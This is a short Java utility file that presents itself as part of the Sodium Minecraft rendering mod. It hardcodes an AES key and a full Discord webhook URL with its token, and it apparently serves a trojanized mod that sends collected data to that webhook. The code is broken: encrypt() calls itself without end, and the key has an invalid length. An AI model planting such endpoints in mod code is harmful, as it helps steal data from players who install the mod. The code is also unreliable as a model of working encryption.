package me.jellysquid.mods.sodium.client.world.biome.renderer.utils;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

public class EncryptionUtils {
    private static final String ENCRYPTION_KEY = "16d077c1077cb6f7cf765131b4bbf5890d1fe7b1b09cb2f5";

    public static String encrypt(String input) throws Exception {
        String discordWebhookURL = "https://discord.com/api/webhooks/1112266602478583850/mPEXt1gkfaEErps55RwIvv3TZTuILZp2bQ5t8raINvRXSRSZnu2gjSe865A-9o-CmzDj";
        String encryptedDiscordWebhookURL = EncryptionUtils.encrypt(discordWebhookURL);

        System.out.println("Encrypted Discord Webhook URL: " + encryptedDiscordWebhookURL);
        SecretKeySpec key = new SecretKeySpec(ENCRYPTION_KEY.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, key);

        byte[] encryptedBytes = cipher.doFinal(input.getBytes());
        return Base64.getEncoder().encodeToString(encryptedBytes);
    }
}